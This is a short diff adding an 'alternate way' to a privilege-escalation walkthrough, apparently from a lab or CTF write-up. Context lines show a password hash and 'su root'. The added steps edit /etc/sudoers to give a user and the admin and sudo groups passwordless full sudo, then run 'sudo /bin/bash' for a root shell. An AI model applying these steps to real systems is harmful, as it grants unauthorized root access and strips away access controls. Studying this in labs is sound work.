@@ -50,3 +50,22 @@ $6$yMsg6cpK$q52od6Zj/FhqmmsuVZ7pKvGJ2o2R/kieZ3SQ/QWWbdn2eVFCTewYvjKBd2P4jfsh9IYw
 
 su root
 enter pass
+
+*Alternate way*
+
+Or you can edit ```/etc/sudoers/```
+
+```
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+jonathan ALL=(ALL:ALL) NOPASSWD: ALL
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) NOPASSWD: ALL
+
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) NOPASSWD: ALL
+```
+exit the ssh, relogin and just do ```sudo /bin/bash```
+
+
+
